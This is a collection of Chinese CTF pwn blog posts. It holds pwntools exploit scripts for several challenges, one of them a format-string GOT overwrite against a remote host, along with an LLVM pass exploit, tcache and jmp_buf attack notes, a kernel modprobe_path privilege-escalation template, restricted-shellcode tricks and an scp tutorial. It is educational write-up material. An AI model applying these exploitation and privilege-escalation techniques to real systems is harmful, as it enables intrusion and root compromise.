libc2.35，保护全开，只能打tcache范围。因为libc2.35自己一般都是打IO然后largebin attack，导致思维有点固化，没想到这题怎么打 其实largebin attack也只是为了一个任意地址写堆地址，如果可以打tcache poison，就可以任意地址写任意值。 tcache poison只要绕过double free就行，因为要把key值修改，这个love函数中刚好可以实现这个目的，注意有个异或加密就行了 攻击流程 利用strcpy的特点泄露栈地址 第一次打tcache poison申请出某个栈地址，然后用show泄露libcbase，因为发现用通过填满tcache，得到unsorted bin的chunk得到libc的方法不好用 第二次打tcache poison申请出某个栈地址，用read(0, new + 0x38, 0x20uLL)写入rop，不用create函数来写rop是因为strcpy有\x00截断 if ( flag &amp;lt;= 0 ) { puts(&amp;#34;If you abandon her, the best love is forgetting&amp;#34;); *(_QWORD *)new = 0LL; *((_QWORD *)new + 1) = 0LL; result = (_DWORD)new + 16; *((_QWORD *)new + 2) = 0LL; } else { puts(&amp;#34;Please input your love&amp;#34;); return read(0, new + 0x38, 0x20uLL); } exp from pwn import * from pwnlib.util.packing import u64 …  ]]></content></entry><entry><title>关于泄露</title><url>/post/%E5%A0%86%E6%9D%82%E8%AE%B0/%E5%85%B3%E4%BA%8E%E6%B3%84%E9%9C%B2/</url><categories><category>PWN</category><category>堆杂记</category></categories><tags><tag>堆杂记-关于泄露</tag></tags><content type="html"> 打NKCTF2024有一个libc2.23的堆题，虽然笔者不太会libc2.23的堆还是想看一看这个题 堆溢出里面泄露不要只想着传统的通过chunk来泄露，同时也要留意有无其它泄露方式，例如%s 起初泄露遇到一个很大的困难就是每次add 一个chunk就会有fill_labels把chunk上的数据覆盖，于是没有别的思路 要注意到题目中其实有很多%s，如果不遇到\x00，泄露的利用价值很高，比如这里breed函数中如果name为&amp;rsquo;a&amp;rsquo;*16,那么会接着带着泄露出heapbase 同时这个题还可以泄露栈上数据 这个gift code有个很明显的%s泄露漏洞，可以无脑泄露栈上的数据，非常有用 泄露完heapbase,libcbase,pie剩下的随便打了</content></entry><entry><title>函数参数传递</title><url>/post/stackoverflow/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"> 64位函数参数传递 主要区别在于第4个参数，一般函数调用第4个参数是rcx存储，系统调用是r10存储</content></entry><entry><title>红帽杯-2021 simpleVM</title><url>/post/llvm-pwn/%E7%BA%A2%E5%B8%BD%E6%9D%AF-2021-simplevm/</url><categories><category>PWN</category><category>LLVM Pwn</category></categories><tags><tag>llvm pwn</tag></tags><content type="html"><![CDATA[  [TOC]
入门llvm pass的第一题， 这里给出一个写的比较详细的博客 题目分析 先ctrl+g定位到.load段找到pass函数 发现如果函数名为o0o0o0o0就会执行sub_6ac0处的函数 此处的函数就是执行o0o0o0o0函数里的函数 里面就是一个vm很简单，但是被一个地方卡了很久,这里ida翻译的有点问题，仔细看图片内容，ida翻译的让我把指针等级搞混了，然后一直觉得逻辑不对，后来看了一眼才发现是ida翻译错了 关于llvm反汇编难理解的地方的解释 llvm::Value::getName这个函数用来获取函数名称 llvm::Function::begin和llvm::Function::end都是Function类的迭代器对象，其迭代的对象是函数中的基本块。因此这个循环的意思就是对每一个基本块执行sub_6B80函数。 llvm::ilist_iterator&lt;llvm::ilist_detail::node_options llvm::BasicBlock,false,false,void ,false,false&gt;::operator*这条语句中的ilist是LLVM标准库中定义的一个数据结构，与C++标准模板库list类似，但是LLVM中都是使用ilist来存储一个函数的所有基本块或指令，可以将其看成一个列表，针对于LLVM做了一些特殊的优化。 llvm::Instruction::getOpcode(v36) == 55 查看源码才发现其定义保存在llvm/IR/Instruction.def文件中，上面的代码意思是指令码需要为55才能进入下一步操作，否则就会直接跳过这个指令去处理下一条指令。我们看一下llvm/IR/Instruction.def文件中哪个指令的指令码是55： HANDLE_OTHER_INST(55, Call, CallInst) v35 = (llvm::CallBase *)llvm::dyn_cast llvm::CallInst,llvm::Instruction (v36); 这个函数用来获取函数名列表中的函数 (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 这里其实际返回的值应该是函数参数的个数+1 ArgOperand = llvm::CallBase::getArgOperand(v35, 0) 第二个参数表示获取第几个参数，这里就是获取0个参数 v31 = (llvm::ConstantInt *)llvm::dyn_cast llvm::ConstantInt,llvm::Value (ArgOperand);ZExtValue = llvm::ConstantInt::getZExtValue(v31); 把参数变成Int类型，然后进行0扩展 exp clang-8 -emit-llvm -S exp.c -o exp.ll ./opt-8 -load ./VMPass.so -VMPass ./exp.ll就可以拿到shell 这里的思路是先获得opt的free函数的got表内容，然后加减偏移得到ogg的实际地址，然后再往opt的free的got表写入ogg的实际地址即可 // clang-8 -emit-llvm -S exp.c -o exp.ll void add(int num, long long val); void min(int num, long long val); void load(int num); void store(int num); void o0o0o0o0() { add(1, 0x77E100); load(1); min(2, 0x9a6d0); add(2, 0xe3afe); add(1, 0x870); store(1); } 杂记 这里是最初调试的时候记录的一些东西 0x7ffff3b66000 telescope 0x7ffff3b66000+0x20DFC0 b *0x4b8d60 b*0x4b8d65 llvm::FPPassManger::runOnFunction(llvm:Function&amp;) set args -load ./VMPass.so -VMPass ./exp.ll 0x7ffff4e27b48 &lt;llvm::legacy::PassManagerImpl::run(llvm::Module&amp;)+744&gt; call qword ptr [rax + 0x88] &lt;llvm::FPPassManager::runOnModule(llvm::Module&amp;)&gt; 0x7ffff4e2777e &lt;llvm::FPPassManager::runOnModule(llvm::Module&amp;)+46&gt; call llvm::FPPassMana 0x7ffff4e2750a &lt;llvm::FPPassManager::runOnFunction(llvm::Function&amp;)+1002&gt; call qword ptr [rax + 0x88] &lt;0x7ffff3b6c830&gt; b *(0x6B36+0x7ffff3b66000)   ]]></content></entry><entry><title>基于jmp_buf结构体的攻击</title><url>/post/web-pwn/%E5%9F%BA%E4%BA%8Ejmp_buf%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E6%94%BB%E5%87%BB/</url><categories><category>PWN</category><category>Web Pwn</category></categories><tags><tag>web pwn</tag></tags><content type="html"> 前置知识 jmp_buf结构体 setjmp.h 头文件定义了宏 setjmp()、函数 longjmp() 和变量类型 jmp_buf，该变量类型会绕过正常的函数调用和返回规则
jmp_buf 是一个数据类型，用于保存调用环境，包括栈指针、指令指针和寄存器等。在执行 setjmp() 时，这些环境信息会被保存到 jmp_buf 类型的变量中。
int setjmp(jmp_buf environment) 这个宏把当前环境保存在变量 environment 中，以便函数 longjmp() 后续使用。如果这个宏直接从宏调用中返回，则它会返回零，但是如果它从 longjmp() 函数调用中返回，则它会返回一个非零值。
void longjmp(jmp_buf environment, int value) 该函数恢复最近一次调用 setjmp() 宏时保存的环境，jmp_buf 参数的设置是由之前调用 setjmp() 生成的。
根据上述内容，如果jmp_buf结构体存储在栈上，并且我们可以栈溢出覆盖到此处，那么将可以控制程序的流程!!!
pointer_guard 结构体的类型为struct pthread，我们称其为一个thread descriptor，该结构体的第一个域为tchhead_t类型，其定义如下： typedef struct { void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; 0x28 uintptr_t pointer_guard; 0x30 unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; …</content></entry><entry><title>利用函数返回值设置rax</title><url>/post/pwn%E7%AC%94%E8%AE%B0/%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%80%BC%E8%AE%BE%E7%BD%AErax/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"><![CDATA[   利用函数返回值设置rax参数其实是一种挺常见的技巧，read函数可以设置rax，strtol也可以设置rax 这里写的题目是vnctf2023的xxx题目 题目分析：checksec发现开启了pie，这意味着如果没有泄露pie所有gadget都不能用，printf(&ldquo;heyhey , hao_kang_de is %lx \n&rdquo;, v1);只能打印栈地址，起初想看能不能控制来泄露pie或者libcbase，发现都不行，思路就卡住了(做题时也被这个泄露给迷惑了，一直往泄露方面想) 但是栈溢出另一种常见的技巧是打syscall，当时做题的时候忘记了，syscall在无法泄露时非常有用，只要设置好参数即可 此题刚好给了控制rsi,rdx的magic gadget，意思就是让你打syscall，想到了怎么打exp就很好写了 这个题还有个特别之处是libc2.31的strtol函数rdi最终会指向让strtol函数截止的地方，这里就是/bin/sh的地址，我自己的ldd是libc2.35一开始还打不通 exp from pwn import * from pwncli import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 from pwnlib.util.packing import p8 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) elf=ELF(&#34;/home/zp9080/PWN/xxx&#34;) li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;) #彩色打印 p=process(&#34;/home/zp9080/PWN/xxx&#34;) def dbg(): gdb.attach(p,&#39;b *$rebase(0x976)&#39;) pause() payload = flat({ 0x0:&#34;59&#34;, 0x2: &#34;/bin/sh\x00&#34;, 0x30: 0xdeadbeef, 0x38: p8(0x99), 0x39: p8(0x08) },length = 0x3a) p.sendafter(&#34;if you give me your number,i will give you some hao_kang_de\n&#34;,payload) p.recvuntil(&#34;hao_kang_de is &#34;) buf=int(p.recv(14),16) print(hex(buf)) p.sendafter(&#34;anything want to say?\n&#34;,b&#39;aaaa&#39;) p.interactive()   ]]></content></entry><entry><title>盲注</title><url>/post/pwn%E7%AC%94%E8%AE%B0/%E7%9B%B2%E6%B3%A8/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"><![CDATA[  对于盲注，最关键的地方就是根据已有经验去猜 例题 SICTF ROUND3 ezsignin
题目描述，ubuntu:22.04 libc2.35 这个题通过尝试应该是个无限read+printf 解题思路 栈上的内容必定有的是libc_start_main附近的函数，我每次泄露的都是libc_start_call_main+128，用%p泄露出libcbase。题目还有个泄露的是0x404018,一般这种位置的很可能是plt.got，所以可以尝试one_gadget，实在不行就覆盖got表为system函数然后读入/bin/sh from pwn import * context.log_level = &#34;debug&#34; context.arch = &#34;amd64&#34; s = lambda x: p.send(x) r = lambda x: p.recv(x) ra = lambda: p.recvall() rl = lambda: p.recvline(keepends=True) ru = lambda x: p.recvuntil(x) sl = lambda x: p.sendline(x) sa = lambda x, y: p.sendafter(x, y) sla = lambda x, y: p.sendlineafter(x, y) ia = lambda: p.interactive() c = lambda: p.close() p=remote(&#39;yuanshen.life&#39;,40037) def log(x): print(&#34;\x1B[36m{}\x1B[0m&#34;.format(x)) offset = 6 ogg = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43] sla(&#34;And now let&#39;s start the game!!!\n&#34;, &#34;%29$p&#34;) leak_libc = int(r(14), 16) - 0x29d90 log(hex(leak_libc)) sla(&#34;And now let&#39;s start the game!!!\n&#34;,fmtstr_payload(offset, {0x404018: leak_libc + ogg[1]})) # sa(&#34;And now let&#39;s start the game!!!\n&#34;, flat([ # b&#34;%7$s\x00\x00\x00\x00&#34;, # 0x404018 # ])) ia()   ]]></content></entry><entry><title>目录穿越</title><url>/post/web-pwn/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url><categories><category>PWN</category><category>Web Pwn</category></categories><tags><tag>web pwn</tag></tags><content type="html"><![CDATA[  [TOC]
此题是NKCTF2024 httpd这道题 题目分析 %[^ ] 是C语言中 scanf 和 sscanf 函数用于格式化输入的格式化字符串中的一个格式说明符。具体地，%[^ ] 表示要读取的输入字符序列直到遇到第一个空格字符（空格字符之前的字符），然后将其存储到对应的变量中。其中 ^ 符号表示取反，[^ ] 表示除了空格之外的所有字符。这样的格式化说明符通常用于读取字符串中的单词或特定字符之间的内容。 这里最主要的漏洞是v7是char型，那么strlen后超过255后会有溢出漏洞，那么就可以由此进行目录穿越 利用scandir函数进行目录扫描,通过扫描../目录得到../flag.txt目录进行输出 区分sscanf函数与scanf函数 scanf 函数： scanf 函数从标准输入流（通常是键盘）读取输入，可以使用格式化字符串来指定期望输入的格式。 它通常用于从用户键盘输入的交互式输入中读取数据。 例如：scanf(&quot;%d %f&quot;, &amp;intVar, &amp;floatVar); 会尝试从标准输入中读取一个整数和一个浮点数。 sscanf 函数： sscanf 函数用于从一个字符串中按照指定的格式解析数据，与 scanf 不同，它不是直接从标准输入流中读取数据，而是从给定的字符串中读取数据。它通常用于解析字符串中的特定格式的数据。 例如：sscanf(str, &ldquo;%d %f&rdquo;, &amp;intVar, &amp;floatVar); 会尝试从字符串 str 中读取一个整数和一个浮点数。 最后就是要慢慢逆向出逻辑就好了 exp from pwn import * import sys LOCAL = len(sys.argv) == 1 if LOCAL: p = process(&#39;./httpd&#39;) else: p = remote(sys.argv[1], int(sys.argv[2])) p.send(b&#39;GET /.&#39; + b&#39;/&#39; * 256 + b&#39;.. HTTP/1.0\r\n&#39;) p.send(b&#39;host: 0.0.0.10\r\n&#39;) p.send(b&#39;Content-length: 0\r\n&#39;) p.recvuntil(b&#39;./flag.txt:&#39;) data = p.recvline(keepends=False) from Crypto.Cipher import ARC4 print(ARC4.new(b&#39;reverse&#39;).decrypt(data)) # p.interactive() p.close() # NKCTF{35c16fb6-2a41-4b83-b04c-c939281bea4c}   ]]></content></entry><entry><title>强网杯-2022 yakagame</title><url>/post/llvm-pwn/%E5%BC%BA%E7%BD%91%E6%9D%AF-2022-yakagame/</url><categories><category>PWN</category><category>LLVM Pwn</category></categories><tags><tag>llvm pwn</tag></tags><content type="html"> 题目分析 做过前两个llvm的题，逆向基本已经没有什么问题了，题目逻辑都看得懂，题目中有个很明显的后门函数 if ( (__int64)*score &amp;amp;gt; 0x12345678 ) backdoor(); 但是有个很困惑的地方是weaponlist是一个db类型的数组，所以正常赋值肯定无法满足后门函数的条件。这个题还有个误导人的地方就是给了可以处理cmd值的函数，更让人觉得是要通过一堆数值运算让cmd=&amp;amp;ldquo;cat flag&amp;amp;rdquo; 最后有个函数才是真正的漏洞利用点 同时发现这个cnt是个char型，-127~128，有很明显的负数溢出，懂了原理这个负数溢出也是相当的简单 exp // clang-8 -emit-llvm -S exp.c -o exp.ll void winmt000(int x); void winmt001(int x); void winmt002(int x); void winmt003(int x); void winmt004(int x); void winmt005(int x); void winmt006(int x); void winmt007(int x); void winmt008(int x); void winmt009(int x); void winmt010(int x); void winmt011(int x); void winmt012(int x); void winmt013(int x); void winmt014(int x); void winmt015(int x); void winmt016(int x); void winmt017(int x); void winmt018(int x); void winmt019(int x); void winmt020(int x); void winmt021(int x); void winmt022(int x); void winmt023(int x); void winmt024(int x); void winmt025(int x); void winmt026(int x); void winmt027(int x); void winmt028(int x); void winmt029(int …</content></entry><entry><title>权限提升-Change Others</title><url>/post/kernel-pwn/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-change-others/</url><categories><category>PWN</category><category>Kernel Pwn</category></categories><tags><tag>kernel pwn</tag></tags><content type="html"><![CDATA[   如果我们可以改变特权进程的执行轨迹，也可以实现提权。这里我们从以下角度来考虑如何改变特权进程的执行轨迹。 改数据 改代码 符号链接 如果一个 root 权限的进程会执行一个符号链接的程序，并且该符号链接或者符号链接指向的程序可以由攻击者控制，攻击者就可以实现提权。 call_usermodehelper call_usermodehelper 是一种内核线程执行用户态应用的方式，并且启动的进程具有 root 权限。因此，如果我们能够控制具体要执行的应用，那就可以实现提权。 在内核中，call_usermodehelper 具体要执行的应用往往是由某个变量指定的，因此我们只需要想办法修改掉这个变量即可。不难看出，这是一种典型的数据流攻击方法。一般常用的主要有以下几种方式。 修改 modprobe_path 修改 modprobe_path 实现提权的基本流程如下 获取 modprobe_path 的地址。 修改 modprobe_path 为指定的程序。 触发执行 call_modprobe，从而实现提权 。这里我们可以利用以下几种方式来触发 a. 执行一个非法的可执行文件。非法的可执行文件需要满足相应的要求（参考 call_usermodehelper 部分的介绍）。 b. 使用未知协议来触发。 模板 // step 1. modify modprobe_path to the target value // step 2. create related file system(&#34;echo -ne &#39;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag&#39; &gt; /home/pwn/catflag.sh&#34;); system(&#34;chmod +x /home/pwn/catflag.sh&#34;); // step 3. trigger it using unknown executable system(&#34;echo -ne &#39;\\xff\\xff\\xff\\xff&#39; &gt; /home/pwn/dummy&#34;); system(&#34;chmod +x /home/pwn/dummy&#34;); system(&#34;/home/pwn/dummy&#34;); // step 3. trigger it using unknown protocol socket(AF_INET,SOCK_STREAM,132); 着重关注下如何定位 modprobe_path 修改 poweroff_cmd   ]]></content></entry><entry><title>权限提升-Change Self</title><url>/post/kernel-pwn/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-change-self/</url><categories><category>PWN</category><category>Kernel Pwn</category></categories><tags><tag>kernel pwn</tag></tags><content type="html"><![CDATA[   内核会通过进程的 task_struct 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限 struct cred { atomic_t usage; #ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic; #define CRED_MAGIC 0x43736564 #define CRED_MAGIC_DEAD 0x44656144 #endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ ... } 因此，思路就比较直观了，我们可以通过以下方式来提权。无论是哪一种方法，一般都分为两步：定位，修改。 直接修改 cred 结构体的内容 修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred 直接定位 直接定位是很困难的
cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，uid-fsgid 都是执行进程的用户的身份。因此我们可以通过扫描内存来定位 cred。 间接定位 进程的 task_struct 结构体中会存放指向 cred 的指针，因此我们可以 定位当前进程 task_struct 结构体的地址 根据 cred 指针相对于 task_struct 结构体的偏移计算得出 cred 指针存储的地址 获取 cred 具体的地址 利用comm，comm 用来标记可执行文件的名字，位于进程的 task_struct 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。 /* Process credentials: */ /* Tracer&#39;s credentials at attach: */ const struct cred __rcu *ptracer_cred; /* Objective and real subjective task credentials (COW): */ const struct cred __rcu *real_cred; /* Effective (overridable) subjective task credentials (COW): */ const struct cred __rcu *cred; #ifdef CONFIG_KEYS /* Cached requested key. */ struct key *cached_requested_key; #endif /* * executable name, excluding path. * * - normally initialized setup_new_exec() * - access it with [gs]et_task_comm() * - lock it with task_lock() */ char comm[TASK_COMM_LEN]; 直接改 cred 还有一种过时的uaf就不记录了 修改 cred 指针 commit_creds(&amp;init_cred) commit_creds() 函数被用以将一个新的 cred 设为当前进程 task_struct 的 real_cred 与 cred 字段，因此若是我们能够劫持内核执行流调用该函数并传入一个具有 root 权限的 cred，则能直接完成对当前进程的提权工作 int commit_creds(struct cred *new) { struct task_struct *task = current;//内核宏，用以从 percpu 段获取当前进程的 PCB const struct cred *old = task-&gt;real_cred; //... rcu_assign_pointer(task-&gt;real_cred, new); rcu_assign_pointer(task-&gt;cred, new); } 在内核初始化过程当中会以 root 权限启动 init 进程，其 cred 结构体为静态定义的 init_cred，由此不难想到的是我们可以通过 commit_creds(&amp;init_cred) 来完成提权的工作 /* * The initial credentials for the initial task */ struct cred init_cred = { .usage = ATOMIC_INIT(4), #ifdef CONFIG_DEBUG_CREDENTIALS .subscribers = ATOMIC_INIT(2), .magic = CRED_MAGIC, #endif .uid = GLOBAL_ROOT_UID, .gid = GLOBAL_ROOT_GID, .suid = GLOBAL_ROOT_UID, .sgid = GLOBAL_ROOT_GID, .euid = GLOBAL_ROOT_UID, .egid = GLOBAL_ROOT_GID, .fsuid = GLOBAL_ROOT_UID, .fsgid = GLOBAL_ROOT_GID, .securebits = SECUREBITS_DEFAULT, .cap_inheritable = CAP_EMPTY_SET, .cap_permitted = CAP_FULL_SET, .cap_effective = CAP_FULL_SET, .cap_bset = CAP_FULL_SET, .user = INIT_USER, .user_ns = &amp;init_user_ns, .group_info = &amp;init_groups, .ucounts = &amp;init_ucounts, }; commit_creds(prepare_kernel_cred(0)) 内核版本 6.2后失效   ]]></content></entry><entry><title>受限制的shellcode</title><url>/post/shellcode/%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84shellcode/</url><categories><category>PWN</category><category>Shellcode</category></categories><tags><tag>受限制的shellcode</tag></tags><content type="html"> [TOC] 这篇博客不错 shellcode字长受限 一种解决方法是先写入read函数然后再read任意长度的shellcode
无法使用syscall 发现syscall是用不了的，也就是无法使用\x0f\x05,于是所有的都分析完了在这里卡住了，但实际上shellcode不是只能用syscall，只要能合理的利用栈上的残留数据，通过加减相对应的偏移，然后call这个地方，仍然可以执行elf或libc的函数 限制了某些字符 这种一般限制了字符，通过sub、add、xor等指令来绕过 调用syscall很多通过xor,先把数字写入栈上（也可以是别的空间）再xor就可以把这个位置变为\x0f\x05 一些常见指令的机械码： syscall \x0f\x05 ret \xc3
所以考查的是我们用上面有限的汇编指令编写出可用的shellcode，基本思想：mov a,b 用 push b;pop a替换;而像int 0x80 ; syscall这种则通过xor sub and inc dec运算来操作shellcode使之变成我们要的指令
1.数据传送: push/pop eax… pusha/popa
2.算术运算: inc/dec eax… sub al, 立即数 sub byte ptr [eax… + 立即数], al dl… sub byte ptr [eax… + 立即数], ah dh… sub dword ptr [eax… + 立即数], esi edi sub word ptr [eax… + 立即数], si di sub al dl…, byte ptr [eax… + 立即数] sub ah dh…, byte ptr [eax… + 立即数] sub esi edi, dword ptr [eax… + 立即数] sub si di, word ptr [eax… + 立即数]
3.逻辑运算: and al, 立即数 and dword ptr [eax… + 立即数], esi edi and word ptr [eax… + 立即数], si di and ah dh…, byte ptr [ecx edx… + 立即数] and esi edi, dword ptr [eax… + 立即数] and si di, word ptr …</content></entry><entry><title>游戏逆向pwn</title><url>/post/pwn%E7%AC%94%E8%AE%B0/%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91pwn/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"><![CDATA[   一个逆向游戏题,这里有个很明显的任意写漏洞 if ( op == &#39;l&#39; ) player_tile = getchar(); *(_BYTE *)(row[1] + buf + 90 * *row) = player_tile; 但这里有个很恶心的地方*(_BYTE *)(row[1] + buf + 90 * *row) = 0x2E; 这个地方让想任意写2个字节变得困难，因为任意写了一次之后，下一次如果是移动，那么原先写好的地方会被覆盖为\x2e，这意味着只能partial overwrite一个字节，可以负数溢出写call move_player的返回地址，也就是0x0804992C，任意写一个字节意味着0x080499xx的函数我们都可以执行
.text:08049927 call move_player .text:0804992C add esp, 10h 初步分析后发现可以通过修改times来实现无限次数输入，这样就可以正常通关然后就可以执行此处的函数让level,cnt加1 if ( row == 29 &amp;&amp; col == 89 &amp;&amp; level != 4 ) { puts(&#34;You win!\n Next level starting &#34;); ++cnt; ++level; init_player(&amp;row); init_map((int)buf, &amp;row, &amp;level); } 本来以为这样就结束了，结果发现if语句还有个判断是 level != 4，但是win函数里面要求level=5，说明需要用那个任意地址写一个字节来执++cnt;++level;来达到level==5的目的 本以为这样就结束了，发现退不出循环，本来想着修改times来实现无限次数输入，但是发现会满足if里面的条件最终让level=6,cnt=5还是退不出去循环，突然想到再一次任意地址写一个字节,只要跳出循环就行了，这个jnz是循环的语句，刚好发现覆盖为\xfe就可以执行到call win，刚好满足 .text:080499F8 jnz loc_8049905 .text:080499FE sub esp, 0Ch .text:08049A01 lea eax, [ebp+level] .text:08049A07 push eax .text:08049A08 call win 总结
其实这种整数溢出的漏洞还是很好发现的，这种游戏题逆向的漏洞一般也不会太难，主要是*(_BYTE *)(row[1] + buf + 90 * *row) = 0x2E; 这个地方卡了很久，一开始一直以为可以任意地址写任意字节，发现实现不了，于是就转变思路任意地址写一字节也可以控制流程 可以控制流程那么剩下的步骤就是缺什么条件寻找合适的方法满足就好了 exp from pwn import * from pwncli import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 from pwnlib.util.packing import p8 context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;) elf=ELF(&#34;/home/zp9080/PWN/pwn&#34;) li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;) #彩色打印 p=process(&#34;/home/zp9080/PWN/pwn&#34;) def dbg(): gdb.attach(p) pause() # .text:0804997F add esp, 10hbackdoor=0x0804997F p.send(b&#39;l\x7f&#39;) for i in range(3): #(0,-4)修改times payload=b&#39;a&#39;*8+b&#39;w&#39;*4+b&#39;s&#39;*29+b&#39;d&#39;*93 p.send(payload) #-90+39=-51 修改返回地址最低字节 #(-1,39)partial write修改ret ，让level=5,cnt=4 ,但是要注意此时也执行了init payload=b&#39;w&#39;*4+b&#39;d&#39;*35+b&#39;w&#39; p.send(payload) #level==5又有一个很恶心的地方就是row == 29 &amp;&amp; col == 89 时又会执行if里面的语句 #.text:080499FE sub esp, 0Ch所以这里要进行要直接覆盖返回地址为0x080499FE,这样直接跳出循环执行win函数 #level==5也满足了win里面printf的条件 payload=b&#39;l\xfe&#39;+b&#39;w&#39;*4+b&#39;d&#39;*35+b&#39;w&#39; p.send(payload) p.interactive()   ]]></content></entry><entry><title>有关system函数</title><url>/post/pwn%E7%AC%94%E8%AE%B0/%E6%9C%89%E5%85%B3system%E5%87%BD%E6%95%B0/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"><![CDATA[  [TOC]
最近写了vnctf2023的traveler一题，一眼看出是栈迁移，题目也给了system函数，但是卡了很久 但是要注意一个很坑的地方，就是system函数刚进入时要开辟栈空间，那么rsp就会被减，那么一下子就会写入到elf文件中got那些不可写的地方，所以要主要执行system函数时把栈抬高就行了 exp from pwn import * from pwncli import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) elf=ELF(&#34;/home/zp9080/PWN/traveler&#34;) li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;) #彩色打印 p=process(&#34;/home/zp9080/PWN/traveler&#34;) def dbg(): gdb.attach(p,&#39;b *0x40124E&#39;) system_addr=0x4011EC pop_rdi=0x4012c3 leave_ret=0x401253 bss=0x4040A0+0xd00 ret=0x40101a payload=b&#39;a&#39;*0x20+p64(bss+0x20)+p64(0x401216) p.send(payload) p.sendafter(&#34;How many travels can a person have in his life?\n&#34;,b&#39;/bin/sh\x00&#39;) flag=0x4040A0 payload=p64(pop_rdi)+p64(flag)+p64(ret)+p64(system_addr)+p64(bss-8)+p64(leave_ret) p.send(payload) p.sendafter(&#34;How many travels can a person have in his life?\n&#34;,b&#39;/bin/sh\x00&#39;) p.interactive()   ]]></content></entry><entry><title>远程交互</title><url>/post/linux-basic-knowledge/%E8%BF%9C%E7%A8%8B%E4%BA%A4%E4%BA%92/</url><categories><category>Linux Basic Knowledge</category></categories><tags/><content type="html"> [TOC]
登录远程服务器 ssh -p 50022 my@127.0.0.1 -p 后面是端口 my 是服务器用户名 127.0.0.1 是服务器 ip
与远程交互文件 可以参考这篇文章 Linux scp 命令用于 Linux 之间复制文件和目录。 scp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件复制命令。 scp 是加密的，rcp不是加密的，scp 是 rcp 的加强版本。 ##语法 详细参数详细可以上述文章 -r： 复制整个目录
简单写法：scp [可选参数] file_source file_target 从本地复制到远程 scp local_file remote_username@remote_ip:remote_folder scp /home/space/music/1.mp3 root@www.runoob.com :/home/root/others/music scp local_file remote_username@remote_ip:remote_file scp /home/space/music/1.mp3 root@www.runoob.com :/home/root/others/music/001.mp3 scp local_file remote_ip:remote_folder scp /home/space/music/1.mp3 www.runoob.com :/home/root/others/music scp local_file remote_ip:remote_file scp /home/space/music/1.mp3 www.runoob.com :/home/root/others/music/001.mp3 第1,2个指定了用户名，命令执行后需要重新输入密码，第1个仅指定了远程的目录，文件名称不变，第2个指定了文件名； 第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名称不变，第4个指定了文件名； 复制目录命令格式 scp -r local_folder remote_username@remote_ip:remote_folder scp -r /home/space/music/ root@www.runoob.com :/home/root/others/ scp -r local_folder remote_ip:remote_folder scp -r /home/space/music/ www.runoob.com :/home/root/others/ 上面命令将本地音乐目录复制到远程其他目录下 远程复制到本地 从远程复制到本地，只需将本地复制到远程的命令的后2个参数调换顺序即可
